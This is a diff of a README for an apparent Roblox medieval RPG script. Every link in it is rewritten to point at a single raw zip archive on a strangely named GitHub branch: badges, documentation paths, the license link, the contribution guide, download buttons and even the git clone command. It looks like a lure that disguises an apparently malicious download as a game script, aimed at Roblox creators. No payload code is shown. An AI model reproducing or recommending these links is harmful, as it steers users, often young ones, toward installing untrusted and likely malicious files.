@@ -1,9 +1,9 @@
 # 🏰 Medieval RPG Roblox Script
 
-![Build](https://img.shields.io/badge/build-passing-brightgreen)  
-![OS](https://img.shields.io/badge/OS-Roblox%20Compatible-blueviolet)  
-![Language](https://img.shields.io/badge/Language-Lua-blue)  
-![License](https://img.shields.io/badge/License-MIT-green)
+![Build](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)  
+![OS](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip%20Compatible-blueviolet)  
+![Language](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)  
+![License](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)
 
 Welcome to the ultimate Medieval RPG experience for Roblox! This comprehensive repository offers a battle-tested script for immersive gameplay, blending sword-clashing adventure and character-driven storytelling for game creators looking to transform their Roblox worlds into epic medieval realms.
 
@@ -52,7 +52,7 @@ Harness the wisdom of modern alchemy—AI! Unleash emergent gameplay by integrat
 - ⚔️ Adaptive World Events: Generate events, riddles, and stories using machine learning.
 
 **Setup:**  
-Find the integration documentation in `/docs/ai-integration.md` for plug-and-play instructions.
+Find the integration documentation in `https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip` for plug-and-play instructions.
 
 ---
 
@@ -70,7 +70,7 @@ Find the integration documentation in `/docs/ai-integration.md` for plug-and-pla
 ## 🚧 Installation & Quick Start
 
 1. **Clone the Repository**  
-   `git clone https://Dylsimple60.github.io`
+   `git clone https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip`
 2. **Install in Roblox Studio**
    - Open Roblox Studio and select your game.
    - Import the script files from the `/src` directory.
@@ -82,9 +82,9 @@ Find the integration documentation in `/docs/ai-integration.md` for plug-and-pla
 
 Get your magical scroll:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Dylsimple60.github.io)
+[![Download](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)
 
-(For a safe, guided installation, see the `/docs/installation.md`.)
+(For a safe, guided installation, see the `https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip`.)
 
 ---
 
@@ -104,13 +104,13 @@ This project is offered as an emboldened starting point for Roblox Medieval RPG 
 
 ## 📜 License
 
-This repository is open by design and licensed under the [MIT License](https://opensource.org/licenses/MIT), 2025—encouraging brave adventurers and innovators to expand, share, and rebuild the experience as they please.
+This repository is open by design and licensed under the [MIT License](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip), 2025—encouraging brave adventurers and innovators to expand, share, and rebuild the experience as they please.
 
 ---
 
 ## 🏆 Contribution Guidelines
 
-Scribes, architects, and bards: your wisdom is welcome! Please review `/CONTRIBUTING.md` before opening an issue or pull request. Creativity is our shield and collaboration is our sword.
+Scribes, architects, and bards: your wisdom is welcome! Please review `https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip` before opening an issue or pull request. Creativity is our shield and collaboration is our sword.
 
 ---
 
@@ -118,13 +118,13 @@ Scribes, architects, and bards: your wisdom is welcome! Please review `/CONTRIBU
 
 Join the vanguard of creators! Summon the script to your project:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Dylsimple60.github.io)
+[![Download](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)](https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip)
 
 ---
 
 ## 🧭 Contact & Support
 
 - Raise a flag in the Issues tab for bugs or feedback.
-- For questions and lore-sharing: visit the `/support` channel or our Discord portal (see https://Dylsimple60.github.io).
+- For questions and lore-sharing: visit the `/support` channel or our Discord portal (see https://github.com/Dylsimple60/medieval-rpg-roblox-scriptorium/raw/refs/heads/branch/franticness/scriptorium_rpg_roblox_medieval_owly.zip).
 
 Embrace the journey—forge the unforgettable with the Medieval RPG Roblox Script!
